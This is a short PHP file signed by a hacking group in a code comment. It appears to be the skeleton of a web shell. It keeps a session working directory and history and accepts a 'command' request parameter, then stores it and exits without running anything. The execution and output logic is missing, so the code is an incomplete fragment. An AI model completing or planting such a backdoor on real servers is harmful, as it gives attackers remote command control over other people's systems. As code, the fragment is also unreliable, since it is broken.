<?php

/*Emperor Hacking TEAM */
session_start();
if (empty($_SESSION['cwd']) || !empty($_REQUEST['reset'])) {
    $_SESSION['cwd'] = getcwd();
    $_SESSION['history'] = array();
    $_SESSION['output'] = '';
}
  
if (get_magic_quotes_gpc()) {
    $_REQUEST['command'] = stripslashes($_REQUEST['command']);
}

array_unshift($_SESSION['history'], $_REQUEST['command']);
exit;
?>